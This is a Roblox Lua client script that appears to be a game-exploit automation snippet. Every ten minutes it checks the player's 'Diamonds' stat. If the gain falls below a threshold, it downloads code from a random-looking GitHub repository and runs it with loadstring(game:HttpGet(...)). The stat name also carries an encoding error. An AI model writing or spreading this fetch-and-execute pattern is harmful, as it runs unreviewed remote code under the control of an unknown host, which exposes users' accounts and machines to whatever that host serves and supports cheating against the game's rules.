local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local leaderstats = LocalPlayer:WaitForChild("leaderstats")
local diamondStat = leaderstats:WaitForChild("ðŸ’Ž Diamonds")

local function check_diamond_10min()
    local lastDiamonds = diamondStat.Value
    while task.wait(600) do
        local currentDiamonds = diamondStat.Value
        local diamondsEarned = currentDiamonds - lastDiamonds
        lastDiamonds = currentDiamonds

        if diamondsEarned > 0 and diamondsEarned < 1500000 then
            pcall(function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/aztbuirczzxmmcx1zz/9xmin7bszzmiay87zpqla/refs/heads/main/Hallo_tele_lowjoin"))()
            end)
        end
    end
end

task.spawn(check_diamond_10min)
